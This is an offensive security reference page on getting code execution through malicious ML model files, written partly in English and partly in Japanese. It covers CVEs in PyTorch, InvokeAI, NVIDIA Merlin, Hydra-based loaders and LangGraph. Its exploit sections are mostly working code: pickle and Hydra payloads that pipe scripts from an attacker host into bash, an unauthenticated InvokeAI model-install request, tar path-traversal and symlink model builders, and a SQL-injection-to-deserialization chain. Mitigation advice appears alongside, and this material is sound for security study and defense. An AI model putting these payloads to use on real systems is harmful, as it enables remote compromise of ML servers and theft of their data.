# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning models are usually shared in different formats, such as ONNX, TensorFlow, PyTorch, etc. These models can be loaded into developers machines or production systems to use them. Usually the models sholdn't contain malicious code, but there are some cases where the model can be used to execute arbitrary code on the system as intended feature or because of a vulnerability in the model loading library.

At the time of the writting these are some examples of this type of vulneravilities:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | User-controlled `filter` key injects SQL/JSON-path syntax, `UNION SELECT` fabricates a fake checkpoint row, then `msgpack` deserialization imports and calls attacker-chosen Python code | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config sets `_target_` to arbitrary callable (e.g., `builtins.exec`) → executed during load, even with “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Moreover, there some python pickle based models like the ones used by [PyTorch](https://github.com/pytorch/pytorch/security) that can be used to execute arbitrary code on the system if they are not loaded with `weights_only=True`. So, any pickle based model might be specially susceptible to this type of attacks, even if they are not listed in the table above.

### Hydra metadata → RCE (works even with safetensors)

`hydra.utils.instantiate()` imports and calls any dotted `_target_` in a configuration/metadata object. When libraries feed **untrusted model metadata** into `instantiate()`, an attacker can supply a callable and arguments that run immediately during model load (no pickle required).

Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Key points:
- NeMo `restore_from/from_pretrained`、uni2TS HuggingFace coders、FlexTok loaders では、model initialization の前にトリガーされる。
- Hydra の string block-list は、代替 import path（例: `enum.bltns.eval`）や application-resolved names（例: `nemo.core.classes.common.os.system` → `posix`）によって bypass 可能。
- FlexTok は `ast.literal_eval` で stringified metadata も解析するため、Hydra 呼び出し前に DoS（CPU/memory blowup）を起こせる。

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` is a popular open-source web interface for Stable-Diffusion. Versions **5.3.1 – 5.4.2** expose the REST endpoint `/api/v2/models/install` that lets users download and load models from arbitrary URLs.

Internally the endpoint eventually calls:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
提供されたファイルが **PyTorch checkpoint (`*.ckpt`)** の場合、`torch.load` は **pickle deserialization** を実行する。コンテンツはユーザー制御のURLから直接取得されるため、攻撃者は checkpoint 内にカスタム `__reduce__` メソッドを持つ悪意あるオブジェクトを埋め込める。このメソッドは **deserialization 中** に実行され、InvokeAI サーバー上で **remote code execution (RCE)** につながる。

この脆弱性には **CVE-2024-12029**（CVSS 9.8、EPSS 61.17 %）が割り当てられた。

#### Exploitation walk-through

1. 悪意ある checkpoint を作成する:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. `payload.ckpt` をあなたが管理する HTTP サーバーでホストする（例: `http://ATTACKER/payload.ckpt`）。
3. 脆弱なエンドポイントをトリガーする（認証は不要）:
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAI がファイルをダウンロードすると `torch.load()` を呼び出し、`os.system` gadget が実行されて、攻撃者は InvokeAI プロセスのコンテキストで code execution を得る。

すぐ使える exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` が全体の流れを自動化する。

#### 条件

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` が攻撃者から到達可能  
•  Process が shell commands を実行する権限を持つ

#### Mitigations

* **InvokeAI ≥ 5.4.3** に upgrade する – patch は `scan=True` を default に設定し、deserialization の前に malware scanning を実行する。
* checkpoints を programmatically に load する場合は `torch.load(file, weights_only=True)` または新しい [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper を使う。
* model sources に対して allow-lists / signatures を強制し、service を least-privilege で実行する。

> ⚠️ **any** Python pickle-based format（`.pt`, `.pkl`, `.ckpt`, `.pth` files を含む）は、untrusted sources から deserialize するのが本質的に unsafe であることを忘れないでください。

---

古い InvokeAI version を reverse proxy の背後で動かし続ける必要がある場合の、ad-hoc mitigation の例:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec の unsafe `torch.load` による RCE (CVE-2025-23298)

NVIDIA の Transformers4Rec（Merlin の一部）は、ユーザー提供のパスに対して直接 `torch.load()` を呼び出す unsafe な checkpoint ローダーを公開していました。`torch.load` は Python の `pickle` に依存しているため、攻撃者が制御する checkpoint は、deserialization 中に reducer 経由で arbitrary code を実行できます。

脆弱なパス（修正前）: `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

これが RCE につながる理由: Python pickle では、オブジェクトが reducer（`__reduce__`/`__setstate__`）を定義でき、それが callable と引数を返します。その callable は unpickling 中に実行されます。もしそのようなオブジェクトが checkpoint 内に存在すると、weights が使われる前に実行されます。

最小の malicious checkpoint の例:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
配信ベクトルとblast radius:
- repo、bucket、またはartifact registry経由で共有されるTrojanized checkpoints/models
- checkpointsを自動で読み込む自動化された resume/deploy pipelines
- 実行は training/inference workers 内で起こり、しばしば昇格された権限（例: containers 内の root）で動作する

修正: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) は、`torch.load()` を `transformers4rec/utils/serialization.py` に実装された制限付きの allow-listed deserializer に置き換えた。新しい loader は types/fields を検証し、load 中に任意の callables が呼び出されるのを防ぐ。

PyTorch checkpoints に特化した防御指針:
- 信頼できないデータを unpickle しない。可能なら [Safetensors](https://huggingface.co/docs/safetensors/index) や ONNX のような非実行形式を使う。
- PyTorch serialization を使わざるを得ない場合は、`weights_only=True`（新しい PyTorch でサポート）を確実に使うか、Transformers4Rec の patch に似た custom allow-listed unpickler を使う。
- model provenance/signatures を強制し、deserialization を sandbox 化する（seccomp/AppArmor; non-root user; restricted FS と network egress なし）。
- checkpoint load 時に ML services から予期しない child processes が出ないか監視する; `torch.load()`/`pickle` usage を trace する。

POC と vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- モデルを作成する:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- モデルをロードする:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent の FaceDetection-DSFD は、ユーザー制御のデータを deserialization する `resnet` endpoint を公開しています。ZDI は、リモートの攻撃者が被害者に悪意のある page/file を読み込ませ、その endpoint に細工した serialized blob を送らせて、`root` として deserialization をトリガーできることを確認しました。これにより、完全な compromise につながります。

exploit の流れは、典型的な pickle abuse と同じです:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
デシリアライズ中に到達可能な任意のgadget（constructor、`__setstate__`、framework callbacks など）は、transport が HTTP、WebSocket、監視対象ディレクトリに置かれた file のどれであっても、同じように weaponize できます。



### LangGraph checkpointer SQLi → MessagePack RCE

この attack chain が興味深いのは、attacker が **malicious model file を upload する必要がない** ことです。代わりに、application は **AI-agent persistence API**（`get_state_history(..., filter=...)`）を exposed しており、user input が checkpointer query builder に到達します。

#### 1. metadata filters における structural SQLi

脆弱な SQLite pattern は次のようでした:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
値は後でバインドされますが、`query_key` は **JSON path string** に連結されるため、dictionary key 内の `'` は `'$.{query_key}'` から抜け出して SQL を注入します。同じ教訓は **JSON paths、identifiers、operators、`LIMIT`、および TTL fields** にも当てはまります: placeholders は値だけを保護し、structural query syntax は保護しません。

#### 2. `UNION SELECT` can target downstream sinks, not just data theft

その query は `type` とシリアライズされた `checkpoint` bytes を返し、これらは後で次のように消費されます:
```python
self.serde.loads_typed((type, checkpoint))
```
つまり、`WHERE` 句における SQLi は、**偽の結果行** を注入できます:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
後続のコードが任意の選択されたカラムをパース、デシリアライズ、書き込み、または実行する場合、そのカラムをそれぞれの sink に対応付ける。このケースでは、偽の row により SQLi が **attacker-controlled deserialization** に変わる。

#### 3. Unsafe MessagePack extension hooks are equivalent to code gadgets

LangGraph の `msgpack` path では、カスタム extension hook を使ってネストされた tuple を展開し、以下を実行していた:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
MessagePack の extension object エンコーディングで `("os", "system", "id > /tmp/pwned")` に相当するものは、`os` を import し、`system` を解決して、コマンドを実行します。AI フレームワークをレビューするときは、動的 import、reflection、または arbitrary callable dispatch を行う **custom MessagePack/JSON/pickle revivers** を確認してください。

#### 4. agent frameworks の実践的な audit パターン

ユーザー制御可能な入力が次に到達する箇所を確認してください:
- state history / memory / replay / checkpoint listing APIs
- SQL や Redis query fragments を生成する structured filter builders
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- persistence layer から返された rows を信頼する recovery paths

この特定の chain は、信頼されていないユーザーが `filter` を制御できる場合に、**SQLite** または **Redis** checkpointers を使う self-hosted LangGraph deployments に影響しました。disclosure で示された patched versions は `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, `langgraph-checkpoint 4.0.1+` でした。

## Models to Path Traversal

[**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) でコメントされているように、さまざまな AI frameworks で使われる多くの models formats は archive ベースで、通常は `.zip` です。したがって、これらの formats を悪用して path traversal attacks を行い、model が読み込まれる system から任意の files を read できる可能性があります。

たとえば、以下の code を使うと、load されたときに `/tmp` ディレクトリに file を作成する model を作れます:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
あるいは、以下のコードを使うと、読み込まれたときに `/tmp` ディレクトリへの symlink を作成する model を作成できます:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Deep-dive: Keras .keras deserialization and gadget hunting

.keras の内部、Lambda-layer RCE、≤ 3.8 における arbitrary import issue、そして allowlist 内での修正後の gadget 発見についての集中的なガイドは、こちらを参照してください:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [Check Point Research – From SQLi to RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)

{{#include ../banners/hacktricks-training.md}}
